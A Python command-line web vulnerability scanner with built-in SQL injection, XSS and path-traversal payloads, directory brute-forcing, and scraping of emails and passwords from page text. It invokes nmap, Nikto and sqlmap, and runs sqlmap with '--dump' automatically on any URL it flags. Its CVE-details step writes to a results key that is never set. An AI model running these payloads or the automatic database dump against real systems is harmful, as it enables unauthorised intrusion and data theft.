import os
import sys
import json
import re
import socket
import subprocess
import threading
import time
from datetime import datetime
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import requests
from colorama import Fore, Style, init

init(autoreset=True)

class SecurityScanner:
    def __init__(self):
        self.target = ""
        self.proxy = None
        self.threads = 10
        self.results = {
            "basic_info": {},
            "directories": [],
            "vulnerabilities": {
                "xss": [],
                "sqli": [],
                "lfi": [],
                "sensitive_data": []
            },
            "cve": [],
            "tools_output": {}
        }
        self.tools_dir = "tools"
        self.reports_dir = "reports"
        self.payloads = []
        self.directories = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
        
        self.setup_environment()
        self.load_payloads()
        self.load_directories()

    def setup_environment(self):
        """Initialize environment and check dependencies"""
        os.makedirs(self.tools_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)
        
        # Check required tools on Windows
        if sys.platform == "win32":
            self.check_windows_tools()

    def check_windows_tools(self):
        """Verify Windows tool availability"""
        required_tools = {
            "nmap": "nmap --version",
            "nikto": f"{self.tools_dir}\\nikto.pl -Version",
            "sqlmap": f"{self.tools_dir}\\sqlmap.exe --version",
            "perl": "perl -v"
        }
        
        for tool, command in required_tools.items():
            try:
                subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except FileNotFoundError:
                print(f"{Fore.RED}[-] {tool} not found in tools directory!")
                if tool == "perl":
                    print("    Please install Perl from https://www.perl.org/get.html")
                else:
                    print(f"    Download {tool} and place in {self.tools_dir}")

    def load_payloads(self):
        """Load attack payloads"""
        try:
            with open('payloads.txt', 'r') as f:
                self.payloads = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.create_default_payloads()

    def create_default_payloads(self):
        """Create default payloads file"""
        default_payloads = [
            "' OR 1=1--",
            '" OR 1=1--',
            "<script>alert('xss')</script>",
            "><svg/onload=alert(1)>",
            "..%2f..%2fetc%2fpasswd",
            "admin'--",
            "UNION SELECT null,@@version--"
        ]
        with open('payloads.txt', 'w') as f:
            f.write("\n".join(default_payloads))
        print(f"{Fore.YELLOW}[*] Created default payloads.txt")

    def load_directories(self):
        """Load directory list"""
        try:
            with open('directories.txt', 'r') as f:
                self.directories = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.create_default_directories()

    def create_default_directories(self):
        """Create default directories file"""
        default_dirs = [
            "admin",
            "wp-admin",
            "phpmyadmin",
            "backup",
            "config",
            "robots.txt",
            "sitemap.xml",
            ".git",
            "uploads",
            "tmp"
        ]
        with open('directories.txt', 'w') as f:
            f.write("\n".join(default_dirs))
        print(f"{Fore.YELLOW}[*] Created default directories.txt")

    def get_random_user_agent(self):
        """Return random user agent"""
        return self.user_agents[hash(datetime.now().minute) % len(self.user_agents)]

    def scan_basic_info(self):
        """Collect basic target information"""
        try:
            parsed = urlparse(self.target)
            domain = parsed.netloc
            ip = socket.gethostbyname(domain)
            self.results["basic_info"]["domain"] = domain
            self.results["basic_info"]["ip"] = ip
            
            # Get geolocation
            response = requests.get(f"http://ip-api.com/json/{ip}")
            if response.status_code == 200:
                geo_data = response.json()
                self.results["basic_info"]["geolocation"] = {
                    "country": geo_data.get("country"),
                    "city": geo_data.get("city"),
                    "isp": geo_data.get("isp")
                }
        except Exception as e:
            print(f"{Fore.RED}[-] Basic info scan error: {e}")

    def directory_scan(self):
        """Multithreaded directory scanning"""
        def scan_chunk(chunk):
            for directory in chunk:
                url = urljoin(self.target, directory)
                try:
                    headers = {"User-Agent": self.get_random_user_agent()}
                    response = requests.get(url, headers=headers, proxies=self.proxy, timeout=5)
                    if response.status_code == 200:
                        self.results["directories"].append(url)
                        print(f"{Fore.GREEN}[+] Found: {url} [{response.status_code}]")
                except:
                    continue

        chunks = [self.directories[i::self.threads] for i in range(self.threads)]
        threads = []
        for chunk in chunks:
            t = threading.Thread(target=scan_chunk, args=(chunk,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    def scan_xss(self):
        """Advanced XSS scanning with context detection"""
        try:
            response = requests.get(self.target, proxies=self.proxy)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                
                for payload in self.payloads:
                    data = {}
                    for input_field in inputs:
                        name = input_field.get('name', '')
                        if name:
                            data[name] = payload
                            
                    test_url = urljoin(self.target, action)
                    headers = {"User-Agent": self.get_random_user_agent()}
                    response = requests.request(method, test_url, data=data, headers=headers, proxies=self.proxy)
                    
                    if payload.encode() in response.content:
                        context = self.detect_xss_context(response.text, payload)
                        self.results["vulnerabilities"]["xss"].append({
                            "url": test_url,
                            "payload": payload,
                            "context": context
                        })
                        print(f"{Fore.RED}[!] XSS vulnerability found in {context} context: {test_url}")
        except Exception as e:
            print(f"{Fore.RED}[-] XSS scan error: {e}")

    def detect_xss_context(self, html, payload):
        """Detect XSS injection context"""
        soup = BeautifulSoup(html, 'html.parser')
        if re.search(f"<[^>]*{re.escape(payload)}", html):
            return "HTML tag"
        elif re.search(f"=[\"'].*{re.escape(payload)}.*[\"']", html):
            return "Attribute"
        elif f"<script>{payload}</script>" in html.lower():
            return "Script"
        else:
            return "Unknown"

    def scan_sqli(self):
        """Advanced SQLi detection with error analysis"""
        error_patterns = {
            "MySQL": r"SQL syntax.*MySQL",
            "PostgreSQL": r"PostgreSQL.*ERROR",
            "MSSQL": r"Unclosed quotation mark.*SQL Server",
            "Oracle": r"ORA-[0-9]{5}",
            "SQLite": r"SQLite/JDBCDriver"
        }
        
        for directory in self.results["directories"]:
            for payload in self.payloads:
                test_url = f"{urljoin(self.target, directory)}?id={payload}"
                try:
                    headers = {"User-Agent": self.get_random_user_agent()}
                    response = requests.get(test_url, headers=headers, proxies=self.proxy)
                    for db, pattern in error_patterns.items():
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.results["vulnerabilities"]["sqli"].append({
                                "url": test_url,
                                "dbms": db,
                                "payload": payload
                            })
                            print(f"{Fore.RED}[!] {db} SQLi vulnerability detected: {test_url}")
                except Exception as e:
                    print(f"{Fore.RED}[-] SQLi scan error: {e}")

    def scan_lfi(self):
        """Local File Inclusion scan"""
        lfi_payloads = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd"]
        for directory in self.results["directories"]:
            for payload in lfi_payloads:
                test_url = f"{urljoin(self.target, directory)}?page={payload}"
                try:
                    headers = {"User-Agent": self.get_random_user_agent()}
                    response = requests.get(test_url, headers=headers, proxies=self.proxy)
                    if "root:x:0:0" in response.text:
                        self.results["vulnerabilities"]["lfi"].append(test_url)
                        print(f"{Fore.RED}[!] LFI vulnerability detected: {test_url}")
                except Exception as e:
                    print(f"{Fore.RED}[-] LFI scan error: {e}")

    def scan_sensitive_data(self):
        """Extract sensitive information"""
        try:
            response = requests.get(self.target, proxies=self.proxy)
            content = response.text
            
            # Extract emails
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
            if emails:
                self.results["vulnerabilities"]["sensitive_data"].extend(
                    {"type": "email", "data": email} for email in emails
                )
            
            # Extract potential passwords
            pwd_patterns = [
                r'password\s*[=:]\s*[\'"]?(\w+)[\'"]?',
                r'pwd\s*[=:]\s*[\'"]?(\w+)[\'"]?',
                r'passwd\s*[=:]\s*[\'"]?(\w+)[\'"]?'
            ]
            for pattern in pwd_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    self.results["vulnerabilities"]["sensitive_data"].extend(
                        {"type": "password", "data": pwd} for pwd in matches
                    )
        except Exception as e:
            print(f"{Fore.RED}[-] Sensitive data scan error: {e}")

    def run_nmap_scan(self):
        """Run Nmap scan with CVE detection"""
        try:
            print(f"{Fore.YELLOW}[*] Running Nmap CVE scan...")
            target_ip = self.results["basic_info"]["ip"]
            nmap_command = [
                "nmap", "-sV", "--script=vulners", "--script-args", "mincvss=7.0",
                "-p", "80,443,8080,8000", "-T4", "-oN", f"{self.reports_dir}/nmap_scan.txt",
                target_ip
            ]
            result = subprocess.run(nmap_command, capture_output=True, text=True)
            
            # Extract CVEs
            cve_pattern = re.compile(r'(CVE-\d{4}-\d{4,7})')
            cves = list(set(cve_pattern.findall(result.stdout)))
            if cves:
                self.results["cve"] = cves
                print(f"{Fore.RED}[!] Found {len(cves)} CVE vulnerabilities")
            
            self.results["tools_output"]["nmap"] = result.stdout
        except Exception as e:
            print(f"{Fore.RED}[-] Nmap scan failed: {e}")

    def run_nikto_scan(self):
        """Run Nikto vulnerability scan"""
        try:
            print(f"{Fore.YELLOW}[*] Running Nikto scan...")
            nikto_command = [
                "nikto", "-h", self.target, "-Format", "json",
                "-output", f"{self.reports_dir}/nikto_scan.json"
            ]
            result = subprocess.run(nikto_command, capture_output=True, text=True)
            self.results["tools_output"]["nikto"] = result.stdout
        except Exception as e:
            print(f"{Fore.RED}[-] Nikto scan failed: {e}")

    def run_sqlmap_scan(self):
        """Run SQLMap on vulnerable URLs"""
        if not self.results["vulnerabilities"]["sqli"]:
            return
            
        print(f"{Fore.YELLOW}[*] Running SQLMap on vulnerable URLs...")
        for sqli in self.results["vulnerabilities"]["sqli"]:
            try:
                sqlmap_command = [
                    "sqlmap", "-u", sqli["url"], "--batch",
                    "--dump", "--output-dir", f"{self.reports_dir}/sqlmap"
                ]
                result = subprocess.run(sqlmap_command, capture_output=True, text=True)
                self.results["tools_output"].setdefault("sqlmap", []).append(result.stdout)
            except Exception as e:
                print(f"{Fore.RED}[-] SQLMap failed: {e}")

    def check_cve_details(self):
        """Get CVE details from NVD API"""
        if not self.results["cve"]:
            return
            
        print(f"{Fore.YELLOW}[*] Fetching CVE details...")
        for cve_id in self.results["cve"]:
            try:
                response = requests.get(f"https://cve.circl.lu/api/cve/{cve_id}")
                if response.status_code == 200:
                    cve_info = response.json()
                    self.results["cve_details"][cve_id] = {
                        "severity": cve_info.get("cvss", "N/A"),
                        "summary": cve_info.get("summary", "No description"),
                        "references": cve_info.get("references", [])
                    }
            except Exception as e:
                print(f"{Fore.RED}[-] Failed to get CVE details: {e}")

    def generate_report(self, format="json"):
        """Generate scan report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join(self.reports_dir, f"report_{timestamp}.{format}")
        
        try:
            if format == "json":
                with open(report_file, "w") as f:
                    json.dump(self.results, f, indent=4)
            else:
                with open(report_file, "w") as f:
                    f.write("=== Basic Information ===\n")
                    for k, v in self.results["basic_info"].items():
                        f.write(f"{k}: {v}\n")
                    f.write("\n=== Vulnerabilities ===\n")
                    for vuln_type, vulns in self.results["vulnerabilities"].items():
                        f.write(f"\n{vuln_type.upper()}:\n")
                        for vuln in vulns:
                            f.write(f"- {vuln}\n")
                    if self.results["cve"]:
                        f.write("\n=== CVEs ===\n")
                        for cve in self.results["cve"]:
                            f.write(f"- {cve}\n")
            print(f"{Fore.GREEN}[+] Report saved to {report_file}")
        except Exception as e:
            print(f"{Fore.RED}[-] Report generation failed: {e}")

    def show_menu(self):
        """Display main menu"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""{Fore.BLUE}
 _____ _____ _____ _____ 
|     |   __|   __|  _  |
| | | |   __|__   |   __|
|_|_|_|_____|_____|__|   v3.0

{Fore.WHITE}Advanced Security Scanner with CVE Detection
{Fore.YELLOW}Created by YourName
""")
            print(f"""{Fore.CYAN}
[01] Full Scan (All checks)
[02] Quick Scan (Basic checks)
[03] CVE Scan
[04] View Reports
[05] Open Tools Directory
[06] Open Reports Directory
[00] Exit
""")
            choice = input(f"{Fore.WHITE}[?] Enter choice: ").strip()
            
            if choice == "01":
                self.run_full_scan()
            elif choice == "02":
                self.run_quick_scan()
            elif choice == "03":
                self.run_cve_scan()
            elif choice == "04":
                self.view_reports()
            elif choice == "05":
                os.startfile(self.tools_dir) if sys.platform == "win32" else subprocess.run(["xdg-open", self.tools_dir])
            elif choice == "06":
                os.startfile(self.reports_dir) if sys.platform == "win32" else subprocess.run(["xdg-open", self.reports_dir])
            elif choice == "00":
                sys.exit()
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                time.sleep(1)

    def run_full_scan(self):
        """Execute comprehensive scan"""
        self.target = input(f"{Fore.CYAN}[?] Enter target URL: ").strip()
        self.proxy = input(f"{Fore.CYAN}[?] Proxy (http://ip:port): ").strip() or None
        self.threads = int(input(f"{Fore.CYAN}[?] Threads [10]: ") or 10)
        
        print(f"{Fore.YELLOW}[*] Starting full scan on {self.target}...")
        self.scan_basic_info()
        self.directory_scan()
        self.scan_xss()
        self.scan_sqli()
        self.scan_lfi()
        self.scan_sensitive_data()
        self.run_nmap_scan()
        self.run_nikto_scan()
        self.run_sqlmap_scan()
        self.check_cve_details()
        
        report_format = input("\n[?] Save report as [json/txt]: ").lower()
        self.generate_report(report_format)

    def run_quick_scan(self):
        """Execute quick vulnerability scan"""
        self.target = input(f"{Fore.CYAN}[?] Enter target URL: ").strip()
        self.scan_basic_info()
        self.directory_scan()
        self.scan_xss()
        self.scan_sqli()
        report_format = input("\n[?] Save report as [json/txt]: ").lower()
        self.generate_report(report_format)

    def run_cve_scan(self):
        """Execute CVE-focused scan"""
        self.target = input(f"{Fore.CYAN}[?] Enter target URL: ").strip()
        self.scan_basic_info()
        self.run_nmap_scan()
        self.check_cve_details()
        self.generate_report()

    def view_reports(self):
        """Display available reports"""
        reports = os.listdir(self.reports_dir)
        if not reports:
            print(f"{Fore.RED}[-] No reports found!")
            time.sleep(2)
            return
            
        print(f"{Fore.WHITE}Available reports:")
        for i, report in enumerate(reports, 1):
            print(f"[{i}] {report}")
            
        choice = input(f"{Fore.CYAN}[?] Select report: ").strip()
        try:
            selected = reports[int(choice)-1]
            if sys.platform == "win32":
                os.startfile(os.path.join(self.reports_dir, selected))
            else:
                subprocess.run(["xdg-open", os.path.join(self.reports_dir, selected)])
        except:
            print(f"{Fore.RED}[-] Invalid selection!")
            time.sleep(1)

if __name__ == "__main__":
    scanner = SecurityScanner()
    scanner.show_menu()
